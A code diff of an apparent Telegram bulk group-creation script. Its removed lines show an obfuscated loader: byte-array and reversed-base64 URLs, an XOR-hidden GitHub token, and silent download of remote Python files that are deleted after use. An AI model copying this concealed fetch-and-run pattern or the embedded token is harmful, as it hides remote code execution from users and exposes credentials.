@@ -1,5 +1,20 @@
 # =============================== (゜-゜)(。_。) ================================
-import sys, os, subprocess
+import subprocess, sys, os
+try:
+    import rich
+except (ModuleNotFoundError, ImportError):
+    print("[!] Installing rich...")
+    subprocess.check_call([
+        sys.executable, "-m", "pip", "install", "rich"
+    ])
+from rich.tree import Tree
+from rich.style import Style
+from rich.progress import Progress
+from rich.console import Console
+from rich.table import Table
+from rich.panel import Panel
+from rich.text import Text
+import uuid
 try:
     from pyrogram import Client, filters, errors
     from pyrogram.errors import FloodWait
@@ -30,8 +45,11 @@ except (ModuleNotFoundError, ImportError):
         sys.executable, "-m", "pip", "install", "requests"
     ])
     from requests import get as rg
-import time, random, platform, urllib.request, zipfile, threading, asyncio, shutil, atexit, socket, base64, itertools, string
-
+import time, random, platform, urllib.request, zipfile, threading, asyncio, shutil, atexit, socket, base64, itertools, string, hashlib, json, requests, re
+from datetime import datetime
+import logging
+logging.getLogger("asyncio").setLevel(logging.CRITICAL)
+logging.getLogger("pyrogram").setLevel(logging.CRITICAL)
 # =====================  the most import thing ＼(^o^)／ ===================
 w = "\033[1;97m"
 g = "\033[1;92m"
@@ -42,72 +60,19 @@ b = "\033[1;94m"
 p = "\033[1;91m\033[3m"
 l = "\033[1;97m\033[0m"
 
+def cptl(text):
+    for m in range(len(text)):
+        prev = text[:m].upper()
+        colored_prev = "".join([r + c + l for c in prev])
+        current = g + text[m] + l
+        print(colored_prev + current, end="\r")
+        time.sleep(0.1)
+    final = "".join([r + c + l for c in text.upper()])
+    print(final)
 # ===================== My bad, sorry for this salad ＼(-_-) =================
 
 __version__ = "2.6.2"
 REPO = "Joker-Masr2/CreatingTool"
-NAME = "assets/groups"
-epi= "assets/api"
-def _mix(a, b):
-    return ((a << 3) ^ b) & 0xFF
-
-
-def _key():
-    host = socket.gethostname()
-    t = int(time.time()) // 60
-    h = sum(ord(c) for c in host) & 0xFF
-    return _mix(h, t & 0xFF)
-
-Ap = bytes([104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 74, 111, 107, 101, 114, 45, 77, 97, 115, 114, 50, 47, 72, 101, 104, 101, 47, 109, 97, 105, 110, 47, 99, 111, 110, 102, 105, 103, 46, 112, 121]).decode()
-_0P1 = [ord(c) ^ 91 for c in "RExEQuRiYhGofoIrX"]
-_P1 = '0l2ZucXYy9yL6MHc0RHa'
-_P2 = 'yI3ch1ULyV2avp0Lt92YuQnblRnbvNmclNXdiVHa'
-_P3 = '5BnLyVmblR3cpx2XlNWa2JXZz9ibpFWbvUGalh0L'
-_0P2 = [ord(c) ^ 77 for c in "ghp_EutF6zNGCI"]
-_0P3 = [ord(c) ^ 63 for c in "e8A3cZFa9"]
-path = NAME + bytes([46,112,121]).decode()
-Api = epi + bytes([46,112,121]).decode()
-def load_settings():
-    k = _key()
-
-    def decode(part, m):
-        return "".join(chr(x ^ m) for x in part)
-
-    a = decode(_0P2, 77)
-    b = decode(_0P1, 91)
-    c = decode(_0P3, 63)
-
-    return a + b + c
-
-
-jey = load_settings()
-def ur(a, b):
-    return ((a << 3) ^ b) & 0xFF
-
-
-def lm():
-    host = socket.gethostname()
-    t = int(time.time()) // 60
-    h = sum(ord(c) for c in host) & 0xFF
-    return ur(h, t & 0xFF)
-
-def _fix_padding(s):
-    return s + "=" * (-len(s) % 4)
-
-
-def loa():
-    _ = lm()
-
-    data = (_P1[::-1] + _P2[::-1] + _P3[::-1])
-    data = _fix_padding(data)
-
-    decoded = base64.b64decode(data)
-    return decoded.decode("utf-8")
-
-headers = {
-    "Authorization": f"token {jey}",
-    "User-Agent": "Mozilla/5.0"
-}
 def fix_me():
     try:
         api = f"https://api.github.com/repos/{REPO}/releases/latest"
@@ -150,13 +115,6 @@ def fix_me():
 
 def restart():
     os.execv(sys.executable, [sys.executable] + sys.argv)
-def cleanup():
-    try:
-        os.remove(path)
-        os.remove(Api)
-    except:
-        pass
-
 # =======================  Theme  =========================
 def theme():
 	os.system('cls' if os.name == 'nt' else 'clear')
@@ -176,30 +134,9 @@ The tool will make 50 groups for each run.
                                                                                     
 {l}	''')
 
-def down():
-    ok = False
-    try:
-        r = rg(loa(),headers=headers, timeout=5)
-        a = rg(Ap, headers=headers, timeout=5)
-        if r.status_code == 200:
-            with open(path, "wb") as f:
-                f.write(r.content)
-            ok =  True
-        if a.status_code == 200:
-            with open(Api, "wb") as g:
-                g.write(a.content)
-            ok = True
-    except:
-        pass
-    return ok
 
-while True:
-    try:
-        if down():
-            break
-        print(f"{r}(  -。-) =3 Please check your internet connection...{l}")
-        time.sleep(5)
-    except KeyboardInterrupt:
-        print(f"{r}\nBuy Sir(-.-)y-~{l}")
-        time.sleep(2)
-        sys.exit(0)
+# =================== ======= ======= ==============================
+
+
+
+
